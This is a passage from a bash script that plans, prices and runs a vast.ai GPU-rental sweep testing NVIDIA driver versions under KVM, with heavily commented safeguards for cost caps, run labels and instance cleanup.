    # Labels are per-run now, so a reconcile scoped to THIS run's label would
    # find nothing. Reconcile is the cross-run cleanup tool, so it matches the
    # prefix on purpose -- and says so, because that reaches other runs' boxes.
    SWEEP_LABEL="$SWEEP_LABEL_PREFIX"
    RECONCILE_PREFIX=1
    info "reconcile-only: destroying anything whose label starts '$SWEEP_LABEL_PREFIX'."
    info "  This is CROSS-RUN by design: it will destroy boxes belonging to other"
    info "  sweeps that are still running. Spends nothing."
    REGISTRY="$(mktemp)"; CLEANED=1
    reap_strays
    say "still live:"
    live_instance_ids | sed 's/^/  /'
    exit 0
fi

# Optional input caches are irrelevant to emergency cleanup.  Validate them
# only after --reconcile has had a chance to destroy billing instances; a stale
# local path must never prevent leak recovery.
if [ -n "$DRIVER_CACHE_DIR" ]; then
    [ -d "$DRIVER_CACHE_DIR" ] \
        || die "driver cache is not a directory: $DRIVER_CACHE_DIR" 3
    DRIVER_CACHE_DIR="$(cd -- "$DRIVER_CACHE_DIR" && pwd -P)" \
        || die "cannot resolve driver cache: $DRIVER_CACHE_DIR" 3
fi
validate_guest_image_cache \
    || die "refusing untrusted or corrupt guest image cache: $GUEST_IMAGE_CACHE" 3

load_matrix || die "could not read the architecture map out of scripts/sweep_matrix.py"
build_abiq || warn "expected ABI profiles unavailable -- rows will read '?' and no mismatch can be detected"

if [ "$ALL_ARCHES" = 1 ]; then
    # Order: cheapest and best-understood first, so a run that is going to fail
    # for a silly reason fails on a $0.04 box rather than a $2 one.  hopper is
    # last because a VM-capable GH100 offer is rare and may simply not exist --
    # which is recorded as no-offer, not as a failure of the guest stack.
    ARCHES="ampere,turing,ada,blackwell,hopper"
fi
[ -n "$ARCHES" ] || ARCHES="ampere"

# The tree that will be shipped, recorded in every record.  A result without the
# tree it came from is not interpretable: a worktree sitting on uncommitted
# deletions once shipped a silently reverted fix to a paid sweep and nearly cost
# a week chasing a regression that had already been fixed.
TREE_STAMP="$(git -C "$REPO" rev-parse --short HEAD 2>/dev/null || echo unknown)"
DIRTY="$(git -C "$REPO" status --porcelain -- . ':!sweep-runs' 2>/dev/null | wc -l)"
if [ "$DIRTY" -gt 0 ]; then
    TREE_STAMP="$TREE_STAMP+dirty"
    if [ "$GO" = 1 ] && [ "$ALLOW_DIRTY" != 1 ]; then
        git -C "$REPO" status --porcelain -- . ':!sweep-runs' | sed 's/^/    dirty: /' >&2
        die "the working tree does not match HEAD, and the sweep ships the WORKING TREE.
Whatever these boxes measure would be attributed to a commit that is not what ran.
Commit it, stash it, or pass --allow-dirty to ship it knowingly." 3
    fi
fi

# ---- run identity ---------------------------------------------------------
# Settle the run directory and the label BEFORE the plan prints, because the
# plan reports both. Deriving the label after the plan left it blank there --
# and a blank label in the plan is exactly how the shared-label reaping bug
# stays invisible until it destroys someone's box.
if [ -n "$RESUME_DIR" ]; then
    OUT_DIR="$RESUME_DIR"
else
    OUT_DIR="${OUT_DIR:-$REPO/sweep-runs/$(date -u +%Y-%m-%dT%H-%M-%SZ)}"
fi
if [ -z "$SWEEP_LABEL" ]; then
    # Unique by construction -- and it has to be the WHOLE PATH, not the
    # basename.
    #
    # This previously used `basename "$OUT_DIR"`, reasoning that two concurrent
    # runs cannot share an --out. That is true of the PATH and false of the
    # LABEL derived from it. OBSERVED 2026-08-30: two runs with --out
    # .../fullsweep2/run and .../n3/run -- different directories, separate
    # registries, no way to collide on disk -- both produced the label
    # `nvkvm-sweep-run`, because both basenames are "run". reap_strays()
    # destroys BY LABEL, so the first to finish would have destroyed the
    # other's box and called it a stray. That is precisely the failure the
    # per-run label was introduced to stop, reintroduced by taking the last
    # path component of a name whose last component is almost always generic.
    #
    # So: keep the readable tail for humans, and append a hash of the ABSOLUTE
    # path so two runs can only collide if they really are the same directory.
    _run_abs="$(cd "$(dirname "$OUT_DIR")" 2>/dev/null && pwd)/$(basename "$OUT_DIR")"
    _run_hash="$(printf '%s' "$_run_abs" | sha256sum | cut -c1-8)"
    _run_tag="$(basename "$OUT_DIR" | tr -c 'A-Za-z0-9._-' '-' | tr -s '-' | sed 's/-$//' | tail -c 24)"
    SWEEP_LABEL="$SWEEP_LABEL_PREFIX-$_run_tag-$_run_hash"
fi

# ---- plan -----------------------------------------------------------------
say ""
say "nvkvm sweep plan"
say "  tree          : $TREE_STAMP"
say "  image         : $KVM_IMAGE"
say "  architectures : $ARCHES"
say "  driver set    : --preset $PRESET${DRIVERS_REQ:+  (restricted to $DRIVERS_REQ)}"
say "  driver cache  : ${DRIVER_CACHE_DIR:-none (rentals download directly from NVIDIA)}"
say "  guest image   : ${GUEST_IMAGE_CACHE:-none (rentals download directly from Ubuntu)}"
say "  disk          : ${DISK} GB per box"
say "  guest series  : $GUEST_IMAGE_SERIES (the guest KERNEL axis -- sweep rule 4)"
say "  min drivers   : $MIN_DRIVERS per box (fewer verdicts than this FAILS the box)"
if [ "$RUN_STEAMOS" = 1 ]; then
    say "  steamos stage : ON (ref $STEAMOS_REF) -- installs SteamOS on each box and"
    say "                  drives it to a desktop: install, provision, boot,"
    say "                  display, ota, slotb. ~2.5h and ~14 GB extra per box."
fi
if [ "$DESTROY_ON_ERROR" = 1 ]; then
    say "  on failure    : DESTROY (--destroy-on-error) -- nothing left to inspect"
else
    say "  on failure    : KEEP the box for inspection, bounded by the ${BUDGET_HOURS}h auto-destroy"
fi
say "  vast label    : $SWEEP_LABEL"
say "                  (per-run: reap_strays destroys BY LABEL, so a shared one lets"
say "                   concurrent runs reap each other -- OBSERVED 2026-08-29)"
say "  caps          : \$$MAX_DPH/hr per box, \$$MAX_SPEND total, ${BUDGET_HOURS}h auto-destroy"
say "                  storage <= \$$MAX_STORAGE_PER_GB_MONTH/GB/mo, network <= \$$MAX_INET_DOWN_PER_TB/TB in"
say "                  (outlier guards at the observed market maxima; network is NOT in dph_total."
say "                   Preference is in the ranking, which scores compute + disk + transfer.)"
say ""
total_units=0
nboxes=0
for a in ${ARCHES//,/ }; do
    n="$(drivers_for_arch "$a" | wc -l)"
    total_units=$(( total_units + n )); nboxes=$(( nboxes + 1 ))
    open=""; arch_needs_open_module "$a" && open="  [needs -m=kernel-open]"
    say "  $a: $n applicable driver(s), floor $(arch_floor "$a")$open"
    drivers_for_arch "$a" | while IFS='|' read -r v _ p w; do
        printf '      %-12s -> ABI %-4s %s\n' "$v" "$p" "$w"
    done
done
say ""
if [ -n "$MANUAL_SSH" ]; then
    say "  MANUAL HOST: $MANUAL_SSH"
    if [ "$ALLOW_DRIVER_INSTALL" = 1 ]; then
        say "  driver set   : the full list above will be PURGED AND INSTALLED on that host"
        say "                 (--allow-driver-install was given -- this is destructive)"
    else
        say "  driver set   : NOT touched. Only the driver already installed there is measured."
        say "                 (pass --allow-driver-install to sweep the set -- DESTRUCTIVE)"
    fi
    say "  cost         : none. Nothing is rented, nothing is destroyed, nothing is billed."
    say "                 The spend cap and the offer search do not apply to a host we did not rent."
else
say "  $total_units driver run(s) across $nboxes box(es)"
fi

if [ "$GO" != 1 ] && [ -z "$MANUAL_SSH" ]; then
    # A dry run is not just a printout: it exercises the real offer search, the
    # real architecture mapping, the known-bad filter and the price cap against
    # live vast.ai data.  That is the multi-architecture layer, minus the money.
    say ""
    say "  offer lookup (live vast.ai data, read-only):"
    est=0
    for a in ${ARCHES//,/ }; do
        line="$(pick_offer "$a")" || { printf '    %-10s NO RENTABLE KVM OFFER under $%s/hr\n' "$a" "$MAX_DPH"; continue; }
        IFS=$'\t' read -r _ mid gname odph ogeo _ _ ostor odowntb onet <<<"$line"
        n="$(drivers_for_arch "$a" | wc -l)"
        # The SteamOS stage is ~2.5h of box time on top of the driver loop
        # (a 3.2 GB image, Valve's installer, a multi-GB OTA and two boots) and
        # roughly 8 GB more transfer.  Leaving it out of the estimate is how a
        # --steamos run silently costs 3x its printed price.
        hours="$(python3 -c "print(round(1.2 + 0.25 * $n + (2.5 if $RUN_STEAMOS else 0), 2))")"
        # Network scales with the DRIVER COUNT, not with time: one .run per
        # driver is the bulk of it, so a long cheap box is not a cheap box.
        c="$(python3 -c "print(round($odph * $hours + $onet * max(1,$n) / max(1,$n), 2))")"
        netc="$(python3 -c "print(round($onet, 3))")"
        est="$(python3 -c "print(round($est + $c, 2))")"
        printf '    %-10s %-16s $%-7s (disk $%s) machine=%-8s %-18s ~%sh  net~$%s@$%s/TB -> ~$%s\n' \
               "$a" "$gname" "$odph" "$ostor" "$mid" "$ogeo" "$hours" "$netc" "$odowntb" "$c"
    done
    say ""
    say "  estimated total: ~\$$est   (cap is \$$MAX_SPEND)"
fi

if [ "$GO" != 1 ]; then
    say ""
    say "DRY RUN — nothing rented, \$0 spent. Re-run with --go to execute."
    CLEANED=1
    exit 0
fi

# ---- output dir -----------------------------------------------------------
if [ -n "$RESUME_DIR" ]; then
    OUT_DIR="$RESUME_DIR"
    [ -d "$OUT_DIR" ] || die "--resume: no such directory: $OUT_DIR"
    info "resuming into $OUT_DIR (units with a terminal status are not paid for again)"
else
    OUT_DIR="${OUT_DIR:-$REPO/sweep-runs/$(date -u +%Y-%m-%dT%H-%M-%SZ)}"

    mkdir -p "$OUT_DIR"
fi
mkdir -p "$OUT_DIR/logs"
RESULTS="$OUT_DIR/sweep.jsonl"
# Instances deliberately kept for inspection.  In the run dir, so a --resume
# inherits the decision instead of reaping what the previous pass preserved.
KEPT_FILE="$OUT_DIR/kept.instances"
REGISTRY="$OUT_DIR/instances.registry"
touch "$RESULTS" "$REGISTRY" "$KEPT_FILE"
rm -f "${REGISTRY}.done"
info "results: $RESULTS"

# ---- money safety, BEFORE the first cent ----------------------------------
arm_autodestroy

rm -f "$STOP_FILE"
say ""
if [ -n "$MANUAL_SSH" ]; then
    # One host, given to us.  No renting, no destroying, no billing -- so the
    # whole offer/spend/reaper machinery is bypassed rather than fed dummy
    # values that would render as "$0.00" and read like a free run.
    set -- ${ARCHES//,/ }
    [ "$#" -eq 1 ] || die "--ssh takes exactly one --arch (got: '${ARCHES:-none}'). The driver floor and the applicable driver set are per-architecture, and we cannot infer them from a machine we did not choose." 3
    say "=== manual host (arch: $1) ==========================================="
    sweep_manual_box "$1"; rc=$?
    MANUAL_RC="$rc"
else
for arch in ${ARCHES//,/ }; do
    if stop_requested; then
        warn "STOP requested -- not renting any further boxes"
        break
    fi
    say "=== architecture: $arch ==============================================="
    attempt=1
    while [ "$attempt" -le "$BOX_ATTEMPTS" ]; do
        sweep_one_box "$arch"; rc=$?
        # rc=2 means the BOX failed (dead machine, container, build).  Those are
        # worth another try on a DIFFERENT machine -- the blacklist and
        # TRIED_MACHINES guarantee it will not be the same one.  rc=3 is the
        # spend cap, which no retry can fix.
        [ "$rc" = 3 ] && break
        [ "$rc" = 0 ] && break
        attempt=$(( attempt + 1 ))
        [ "$attempt" -le "$BOX_ATTEMPTS" ] && \
            info "retrying $arch on a different machine (attempt $attempt/$BOX_ATTEMPTS)"
    done
done
fi

say ""
say "=== summary ==========================================================="
render_summary | tee "$OUT_DIR/summary.md"
say ""
info "results  : $RESULTS"
info "summary  : $OUT_DIR/summary.md"
info "raw logs : $OUT_DIR/logs/"

cleanup

# ---- exit code ------------------------------------------------------------
read -r UNTESTED_TOTAL FAIL_TOTAL <<<"$(python3 - "$RESULTS" <<'PY'
import json, sys
VERDICT = {"pass", "fail", "incomplete"}
u = f = 0
try:
    for line in open(sys.argv[1]):
        line = line.strip()
        if not line: continue
        try: r = json.loads(line)
        except Exception: continue
        st = r.get("status") or ""
        if st.startswith("control-") or st == "driver-predates-gpu":
            continue
        if st not in VERDICT:
            u += 1
        elif st in ("fail", "incomplete"):
            f += 1
except FileNotFoundError:
    pass
print(u, f)
PY
)"

if [ "$LEAK_SUSPECTED" = 1 ]; then
    warn "EXIT 4: an instance may still be billing. Read the reconciliation above."
    exit 4
fi
if [ "${UNTESTED_TOTAL:-0}" -gt 0 ]; then
    warn "EXIT 2: ${UNTESTED_TOTAL} unit(s) were NOT tested. Coverage is incomplete --"
    warn "        this run must not be read as a clean sweep."
    exit 2
fi
if [ "${FAIL_TOTAL:-0}" -gt 0 ]; then
    warn "EXIT 1: ${FAIL_TOTAL} validate.sh failure(s) -- a real nvkvm result."
    exit 1
fi
info "EXIT 0: every applicable driver on every requested architecture passed."
exit 0
